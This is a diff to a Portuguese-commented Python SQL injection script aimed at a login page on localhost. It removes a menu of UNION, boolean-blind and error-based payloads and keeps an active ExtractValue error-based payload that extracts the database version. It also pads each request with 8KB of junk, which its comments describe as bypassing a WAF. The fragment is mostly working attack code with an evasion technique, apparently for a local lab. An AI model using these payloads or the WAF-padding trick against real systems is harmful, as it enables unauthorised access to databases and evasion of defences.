@@ -10,24 +10,8 @@ url = "http://localhost/sqli-login.php" # colocar aqui a url de destino da aplic
 # 1. Gerar 8KB de lixo (O Bypass do WAF)
 lixo = "A" * 8192 # comente aqui caso não queira utilizar o bypass
 
-# ==============================================================================
-# ÁREA DE TESTE - ESCOLHA SEU PAYLOAD AQUI
-# Descomente apenas um payload por vez para testar
-# ==============================================================================
-
-# --- CASO 1: UNION BASED (Fabricar um usuário falso) ---
-# Tenta unir o resultado com uma linha falsa (1, 'hacker', '123')
-# payload_ataque = "' UNION SELECT 1, 2, 3 -- " 
-# (Nota: Se falhar, tente ajustar o número de colunas: 1, 2, 3, 4...)
-
 # --- CASO 2: ERROR BASED (Extrair versão via erro XML) ---
-#payload_ataque = "' AND ExtractValue(1, concat(0x3a, @@version)) -- "
-
-# --- CASO 3: BOOLEAN BLIND (Adivinhar versão do banco) ---
-# Se a versão começar com 1, o login funciona. Se não, falha.
-payload_ataque = "' OR (SUBSTRING(@@version, 1, 1) = '1') -- "
-
-# ==============================================================================
+payload_ataque = "' AND ExtractValue(1, concat(0x3a, @@version)) -- "
 
 # 2. Construir os dados
 # O 'lixo' vem primeiro para cegar o WAF.
